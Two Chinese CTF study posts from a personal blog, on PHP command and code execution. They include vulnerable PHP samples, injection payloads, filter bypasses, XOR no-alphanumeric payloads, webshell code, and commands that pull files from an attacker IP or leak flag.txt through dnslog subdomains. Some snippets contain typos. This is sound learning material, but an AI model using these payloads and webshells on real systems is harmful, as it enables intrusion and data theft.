<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="WJW&#39;s Blog">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="WJW&#39;s Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="WJW">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>WJW's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="WJW's Blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">WJW's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">62</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/23/CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat.jpg">
      <meta itemprop="name" content="WJW">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WJW's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/23/CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">CTF-命令执行</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-23 13:56:41" itemprop="dateCreated datePublished" datetime="2021-05-23T13:56:41+08:00">2021-05-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-06-02 20:17:24" itemprop="dateModified" datetime="2021-06-02T20:17:24+08:00">2021-06-02</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.2k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>简单介绍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户通过浏览器提交执行命令，由于服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者从$PATH或程序执行环境的其他方面来执行一个恶意构造的代码</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令执行与代码执行区别：</span><br><span class="line">1、命令执行漏洞：直接调用操作系统命令</span><br><span class="line">直接</span><br><span class="line">2、代码执行漏洞：靠执行脚本代码调用操作系统命令</span><br><span class="line">间接</span><br></pre></td></tr></table></figure>





<p>命令执行函数</p>
<p>了解相关函数</p>
<p>参考文档</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.exec.php">https://www.php.net/manual/zh/ref.exec.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system函数</span><br><span class="line">exec函数</span><br><span class="line">shell_exec函数</span><br><span class="line">passthru函数 可以直接执行并输出结果</span><br><span class="line">``反引号与shell_exec函数类似。</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="命令执行分类"><a href="#命令执行分类" class="headerlink" title="命令执行分类"></a>命令执行分类</h4><p>根据有无输出结果，有无回显分类</p>
<p>判断是否存在命令执行姿势</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、根据页面响应延时</span><br><span class="line">2、发送http请求，http服务端显示请求</span><br><span class="line">3、发送dns请求，dns服务端显示请求</span><br></pre></td></tr></table></figure>



<p><strong>延时执行</strong></p>
<p>在shell命令中，具有sleep命令可完成延时执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -alh |sleep 3</span><br><span class="line">-alh显示所有文件，有利于我们观察，管道符(分隔符也可以，分别执行)，前面输出结果作为后面的输入。</span><br></pre></td></tr></table></figure>

<p>利用于无回显漏洞代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">此命令不会将结果输出，我们通过延时执行判断是否存在命令执行。</span><br></pre></td></tr></table></figure>





<p><strong>http请求端口监听</strong></p>
<p>服务端设置监听80端口，等待连接，输出相应</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 80</span><br><span class="line">或</span><br><span class="line">python -m SimpleHTTPServer -p 80</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 服务端ip地址:80</span><br><span class="line">通过curl进行连接</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">访问</span><br><span class="line">?cmd=curl ip:80</span><br><span class="line">若出现请求则存在命令执行漏洞。</span><br></pre></td></tr></table></figure>





<p><strong>dns请求</strong></p>
<p>网站</p>
<p><a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
<p>或</p>
<p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问</span><br><span class="line">?cmd=ping -c 3 xxx.dnslog.cn</span><br><span class="line">-c 设置ping次数</span><br></pre></td></tr></table></figure>



<p><strong>dnslog利用命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include(flag.txt)</span><br><span class="line">	$cmd=&#x27;ping -c 3.GET[&#x27;a&#x27;];&#x27;</span><br><span class="line">	echo $cmd;</span><br><span class="line">	$out=shell_exec($cmd);</span><br><span class="line">?&gt;</span><br><span class="line">由于无回显，不能直接cat读取文件内容，</span><br><span class="line">权限较高时，可以进行本地读取：</span><br><span class="line">?a=;copy flag.txt flag.txt</span><br><span class="line">然后直接访问flag.txt</span><br><span class="line"></span><br><span class="line">方法二dns请求读取</span><br><span class="line"></span><br><span class="line">去掉文本中的空格，然后把内容拼接到域名</span><br><span class="line">sed s/空格/没有任何内容/替换文本内容为空，[[:space:]]表示代码中的空格</span><br><span class="line">?a=`cat flag.txt|sed s/[[:space:]]//g.+子域名` g参数表示全局</span><br><span class="line">域名只能出现数字、下划线、横杠、字母，如果ping命令不支持特殊符号，我们需要进行替换</span><br><span class="line">?a=`cat flag.txt|sed s/[[:space:]]//g|tr &quot;&lt;|?|$|&#123;|&#125;|&#x27;|;|=&gt;&quot; &quot;0&quot;`.+子域名</span><br><span class="line">替换为0</span><br><span class="line">?a=`cat flag.txt|sed s/[[:space:]]//g|tr &quot;&lt;|?|$|&#123;|&#125;|&#x27;|;|=&gt;&quot; &quot;1&quot;`.+子域名</span><br><span class="line">替换为1，对比猜出flag。</span><br></pre></td></tr></table></figure>





<h4 id="命令执行技巧"><a href="#命令执行技巧" class="headerlink" title="命令执行技巧"></a>命令执行技巧</h4><p>利用linux shell中特性</p>
<p><strong>linux shell分隔符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%0a </span><br><span class="line">%0d</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">||前面错了，才会执行后面的。</span><br><span class="line">&amp;&amp;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">	$b=shell_exec(&#x27;echo &#x27;.$a);</span><br><span class="line">	echo $b;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?a=abc%0d`whoami`记得反引号</span><br><span class="line">?a=abc;whoami</span><br></pre></td></tr></table></figure>





<p><strong>linux shell空格</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%09</span><br><span class="line">$IFS$9</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS</span><br></pre></td></tr></table></figure>



<h4 id="常见绕过技巧"><a href="#常见绕过技巧" class="headerlink" title="常见绕过技巧"></a>常见绕过技巧</h4><p><strong>1、重定义变量 绕过命令过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;a=l;b=s;$a$b</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>



<p><strong>2、base64编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo base64编码| base64 -d`</span><br></pre></td></tr></table></figure>



<h4 id="长度限制命令执行"><a href="#长度限制命令执行" class="headerlink" title="长度限制命令执行"></a>长度限制命令执行</h4><p>无长度限制，可上传webshell，下载webshell，并重命名为x.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$output=shell_exec($cmd);</span><br><span class="line">	echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当前用户对该目录具有读写权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、执行命令</span><br><span class="line">wget ip/a mv a a.php</span><br><span class="line"></span><br><span class="line">2、直接写入webshell</span><br><span class="line">执行命令</span><br><span class="line">echo &lt;?php &quot;eval($_POST[1];)&quot; &gt; a.php</span><br></pre></td></tr></table></figure>



<p>存在长度限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用w&gt;重定向，拼接,倒序执行，其中\是长命令分隔，可将一条命令在多行执行，这里没有使用到。</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">w&gt;&#x27;?&gt;&#x27;</span><br><span class="line">W&gt;&#x27;($_POST[]);&#x27;</span><br><span class="line">W&gt;&#x27;eval&#x27;</span><br><span class="line">w&gt;&#x27;&lt;?php&#x27;</span><br><span class="line">ls -t &gt;1.php</span><br></pre></td></tr></table></figure>





<h4 id="无数字字母的执行"><a href="#无数字字母的执行" class="headerlink" title="无数字字母的执行"></a>无数字字母的执行</h4><p>php生成异或代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a=&#x27;~@#$%^&amp;*()_+/?.,&lt;&gt;-=&#123;&#125;[]|&#x27;;</span><br><span class="line">	for($i=0;$i&lt;strlen($a);$i++)</span><br><span class="line">		for($j=0;$j&lt;strlen($a);$j++)&#123;</span><br><span class="line">			if(ord($a[$i]^$a[$j])&gt;64 &amp;&amp; ord($a[$i]^$a[$j])&lt;91)&#123;</span><br><span class="line">			echo $a[$i].&#x27;  xor  &#x27;.$a[$j].&#x27;  is  &#x27;;</span><br><span class="line">			echo chr(ord($a[$i]^$a[$j])).&#x27; &#x27;;</span><br><span class="line">			echo ord( $a[$i]^$a[$j]);</span><br><span class="line">			echo &quot;\n&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">	else  if(ord($a[$i]^$a[$j])&gt;96 &amp;&amp; ord($a[$i]^$a[$j])&lt;122)&#123;</span><br><span class="line">			echo $a[$i].&#x27;  xor  &#x27;.$a[$j].&#x27;  is  &#x27;;</span><br><span class="line">			echo chr(ord($a[$i]^$a[$j])).&#x27; &#x27;;</span><br><span class="line">			echo ord($a[$i]^$a[$j]);</span><br><span class="line">			echo &quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br></pre></td></tr></table></figure>











<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function getFlag()&#123;</span><br><span class="line">		echo flag&#123;&#x27;xxx&#x27;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">	if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">		$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">		if(preg_match(&quot;/[A-Za-z0-9]+/&quot;($code))&#123;</span><br><span class="line">			die(&quot;no&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		echo $code;</span><br><span class="line">		eval($code);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">	highlight_file(__FILE__)</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&#x27;&lt;&gt;&#123;=@^[&#x27;  ^ &#x27;[[/&#123;,?&lt;&#x27;;$_();</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
<div>
  
</div>
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/21/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat.jpg">
      <meta itemprop="name" content="WJW">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WJW's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/21/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">CTF-代码执行</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-21 13:54:00" itemprop="dateCreated datePublished" datetime="2021-05-21T13:54:00+08:00">2021-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-23 14:10:44" itemprop="dateModified" datetime="2021-05-23T14:10:44+08:00">2021-05-23</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>代码执行介绍</p>
<p>五类相关函数</p>
<p>1、eval+assert函数</p>
<p>2、preg_replace/e最新php不支持，php5广泛使用</p>
<p>3、用户自定义函数</p>
<p>4、动态函数</p>
<p>5、其他</p>
<p>1、</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eval(php4 php5 php7)--把字符串作为php代码执行，当用户可以控制字符串内容，那么此时存在代码注入漏洞。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	eval(&#x27;phpinfo;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">eval执行的代码必须加分号，不然会报错。</span><br><span class="line">assert类似，但是兼容性更强，字符串中可不加分号，但是php7.1以上已经废弃assert</span><br></pre></td></tr></table></figure>



<p>安全人员防御：加引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	eval(&quot;\$ret=strtolower(&#x27;$cmd&#x27;);&quot;)//将字符串转为小写，反斜杠转义$,为了不当做变量处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>绕过姿势：</p>
<p>闭合+注释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);phpinfo();//注释掉后面的内容</span><br><span class="line">传入变成</span><br><span class="line">$ret=strtolower(&#x27;&#x27;);phpinfo();//</span><br></pre></td></tr></table></figure>

<p>如果安全人员开启了GPC将无法绕过</p>
<p>因为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;会变成\&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在php5之前，magic_quotes_gpc默认开启，但是在php的cookies中，如果有单引号将会被反斜杠转义，现在差不多淘汰，一般使用stripslashes函数转义</span><br><span class="line">传入1&#x27;直接变成\&#x27;</span><br></pre></td></tr></table></figure>





<p>2、</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">preg_place</span><br><span class="line">存在危险修饰符/e</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abc&quot;)</span><br><span class="line">?&gt;</span><br><span class="line">这里匹配到了abc可直接执行传入的内容。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;,&#x27;$ret=&quot;\\1&quot;;&#x27;,$cmd)//反斜杠转义/，说明是字符串的内容。</span><br><span class="line">	echo $ret;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>



<p>3、自定义函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可构造特殊字符串传递给该函数执行任意命令。</span><br><span class="line">&lt;?php</span><br><span class="line">	$func=create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">	$func();</span><br><span class="line">?&gt;</span><br><span class="line">第一个为参数，第二个为代码。</span><br></pre></td></tr></table></figure>



<p>4、动态函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function a()&#123;</span><br><span class="line">	echo &#x27;a&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isset($_GET[&quot;func&quot;]))&#123;</span><br><span class="line">		$myfunc=$_GET[&quot;func&quot;]</span><br><span class="line">		$myfunc();</span><br><span class="line">	&#125;</span><br><span class="line">传入?func=phpinfo	</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">传入</span><br><span class="line">?a=assert&amp;b=phpinfo()</span><br></pre></td></tr></table></figure>



<p>用户自定义函数回调</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(&#x27;assert&#x27;,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用is_callable函数来确定某函数是否可回调</span><br><span class="line">输出1表示可，没输出不可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传递数组类型</span><br><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$arrar[0]=$cmd;</span><br><span class="line">	call_user_func_array(&#x27;assert&#x27;,$array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果代码没有转为数组，我们可以直接传入数组</span><br><span class="line"></span><br><span class="line">?cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>



